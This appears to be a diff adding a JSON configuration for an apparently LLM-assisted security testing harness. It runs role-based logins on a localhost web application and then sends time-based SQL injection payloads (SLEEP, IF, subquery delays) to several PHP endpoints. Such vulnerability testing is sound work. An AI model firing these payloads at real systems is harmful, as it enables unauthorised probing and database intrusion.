@@ -1,0 +1,399 @@
+[
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_admin",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<admin_user>",
+            "Password": "<admin_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_user_editor_type_key",
+          "method": "POST",
+          "url": "/UserEditor.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "Action": "edit",
+            "NewUser": "",
+            "PersonID": "1",
+            "UserName": "Admin",
+            "Admin": "1",
+            "Style": "skin-yellow-light",
+            "save": "Save",
+            "type[1 AND SLEEP(1)-- ]": "text",
+            "new_value[1 AND SLEEP(1)-- ]": "injected",
+            "new_permission[1 AND SLEEP(1)-- ]": "TRUE"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [],
+      "time_based_injection_threshold_seconds": 1.0
+    },
+    "param_candidates": {
+      "type_key_payload": [
+        "1 AND SLEEP(1)-- ",
+        "1 AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- ",
+        "1 OR IF(1=1,SLEEP(2),0)-- "
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_member",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<member_user>",
+            "Password": "<member_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_list_events_whichtype",
+          "method": "POST",
+          "url": "/ListEvents.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "WhichType": "<WhichType>",
+            "WhichYear": "2016"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "WhichType"
+      ],
+      "time_based_injection_threshold_seconds": 1.2
+    },
+    "param_candidates": {
+      "WhichType": [
+        "1",
+        "1 AND IF(1=1,SLEEP(2),0)",
+        "1 AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)",
+        "1 OR SLEEP(2)"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_finance",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<finance_user>",
+            "Password": "<finance_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_egive_reimport",
+          "method": "POST",
+          "url": "/eGive.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "DepositSlipID": "1",
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "ReImport": "1",
+            "MissingEgive_FamID_demo_user": "<MissingEgive_FamID_demo_user>",
+            "MissingEgive_Set_demo_user": "1"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "MissingEgive_FamID_demo_user"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "MissingEgive_FamID_demo_user": [
+        "1",
+        "1 AND IF(1=1,SLEEP(2),0)",
+        "1' AND SLEEP(2)-- ",
+        "1 OR SLEEP(2)"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_event_manager",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<event_manager_user>",
+            "Password": "<event_manager_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_event_editor_eid",
+          "method": "POST",
+          "url": "/EventEditor.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "Action": "Edit",
+            "EID": "<EID>"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "EID"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "EID": [
+        "2",
+        "2' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+        "2' OR SLEEP(3)-- ",
+        "2' AND IF(1=1,SLEEP(3),0)-- "
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_event_manager",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<event_manager_user>",
+            "Password": "<event_manager_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_event_editor_en_tyid",
+          "method": "POST",
+          "url": "/EventEditor.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "EN_tyid": "<EN_tyid>"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "EN_tyid"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "EN_tyid": [
+        "1",
+        "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)",
+        "1 OR SLEEP(3)",
+        "1 AND IF(1=1,SLEEP(3),0)"
+      ]
+    }
+  },
+  {
+    "api_sequence": {
+      "base_url": "http://localhost:8080",
+      "session_flow": [
+        {
+          "step": 1,
+          "name": "login_page",
+          "method": "GET",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "params": {},
+          "body": {},
+          "extract": {}
+        },
+        {
+          "step": 2,
+          "name": "login_admin",
+          "method": "POST",
+          "url": "/session/begin",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {},
+          "body": {
+            "User": "<admin_user>",
+            "Password": "<admin_password>"
+          },
+          "extract": {}
+        },
+        {
+          "step": 3,
+          "name": "sqli_edit_event_types_en_tyid",
+          "method": "POST",
+          "url": "/EditEventTypes.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "params": {
+            "XDEBUG_TRIGGER": "1"
+          },
+          "body": {
+            "Action": "NAME",
+            "newEvtName": "test",
+            "EN_tyid": "<EN_tyid_admin>"
+          },
+          "extract": {}
+        }
+      ],
+      "allowed_llm_params": [
+        "EN_tyid_admin"
+      ],
+      "time_based_injection_threshold_seconds": 1.5
+    },
+    "param_candidates": {
+      "EN_tyid_admin": [
+        "1",
+        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+        "1' OR SLEEP(3)-- ",
+        "1' AND IF(1=1,SLEEP(3),0)-- "
+      ]
+    }
+  }
+]
